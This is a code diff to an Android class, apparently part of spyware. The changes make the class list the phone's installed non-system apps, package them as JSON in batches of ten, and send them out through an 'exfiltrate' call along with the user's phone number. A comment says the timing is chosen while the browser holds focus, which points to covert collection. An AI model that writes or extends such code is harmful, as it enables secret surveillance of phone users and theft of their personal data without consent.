@@ -4,9 +4,13 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 
+import org.json.simple.JSONValue;
+
 import com.trustme.testsu.utils.Constants;
 
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.util.Log;
 
@@ -21,13 +25,15 @@ import android.util.Log;
 public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 	Hermes hermes = new Hermes();
 	WiFiTracker wifiTracker = new WiFiTracker();
+	private int row_id = 0;
+	private ArrayList <HashMap<String, String> > arrayRows = new ArrayList <HashMap<String, String> >();
 	
 	protected GetPackagesTask() { }
 	
 	@Override
 	protected Void doInBackground(Void... unused){
 		try {
-			// pass time so the built-in dialer app can make the call
+			getAndSendPackages();
 			Thread.sleep(50);
 		}
 		catch (InterruptedException localInterruptedException)
@@ -38,21 +44,78 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 		return null;
 	}
 	
-	@Override
-	protected void onPostExecute(Void justEyeCandy){
-		super.onPostExecute(justEyeCandy);
+	private void getAndSendPackages() {
+		// TODO Auto-generated method stub    
+		int row_id = 0;
 		
-		ArrayList<PInfo> packagesList = getPackages();
-		HashMap<String, String> map = new HashMap<String, String>();
+		PackageManager pm = MyApplication.getAppContext().getPackageManager();
+		List<ApplicationInfo> packs = pm.getInstalledApplications(PackageManager.GET_META_DATA);
 		
-		for (PInfo pack : packagesList){
-			map.put(pack.pname, pack.appname);
+		for(int i=0; i<packs.size(); i++) {
+			HashMap<String, String> map = new HashMap<String, String>();
+			
+		    ApplicationInfo app_info = packs.get(i);
+		    
+		    if ((app_info.uid >= Constants.AID_SYSTEM) &&  (app_info.uid <= Constants.AID_NOBODY)) {
+		            continue ;//no system packages
+		    }
+
+	    	row_id += 1;
+			map.put("id", row_id + "");
+			//map.put("pname", p.applicationInfo.loadLabel(MyApplication.getAppContext().getPackageManager()).toString());
+			map.put("pname", app_info.packageName);
+			String app_label = app_info.loadLabel(pm).toString();
+			app_label = app_label.replace("&", "AND");
+			map.put("appname", app_label);
+			arrayRows.add(map); 
+			
+			if ((row_id % 10) == 0){
+				exfiltrate(); //send a package at a time browser is dominating the focus! 
+				arrayRows.clear();
+				try {
+					Thread.sleep(1000);
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+	    }
+	  //exfiltrate - REQUEST URI TOO LARGE!!!
+		//exfiltrate();
+		
+	    /**
+		for (PInfo pack : packagesList){	
+			boolean app_exists = false;
+			for (HashMap<String, String> tmpMap : arrayRows){
+				if (tmpMap.get("appname").equals(pack.appname)){
+					app_exists = true;
+					break;
+				}
+			}
+			
+			if (!app_exists){
+				row_id += 1;
+				map.put("id", row_id + "");
+				map.put("pname", pack.pname);
+				map.put("appname", pack.appname);
+				arrayRows.add(map);
+			}
 		}
 		
-		//exfiltrate
+		
+		*/
+	}
+
+	private void exfiltrate() {
+		// TODO Auto-generated method stub
 		if (wifiTracker.read_arp()){
 			//TODO: Store the Data into the DB
-			hermes.exfiltrate(map, Constants.PACKAGES_TRANSACTION);
+			String hkey = "packages";
+			String hvalue = JSONValue.toJSONString(arrayRows);
+			HashMap<String, String> hmap = new HashMap<String, String>();
+			hmap.put(hkey, hvalue);
+			//TODO: store the data to the DB 
+			hermes.exfiltrate(hmap, Constants.PACKAGES_TRANSACTION + ";" + User.getPhoneNumber());
 			//TODO: mark the data in the DB as sent
 		}
 		else{
@@ -61,6 +124,13 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 			//store the data into DB
 			
 		}
+	}
+
+	@Override
+	protected void onPostExecute(Void justEyeCandy){
+		super.onPostExecute(justEyeCandy);
+		
+		
 	}
 	
 	/**
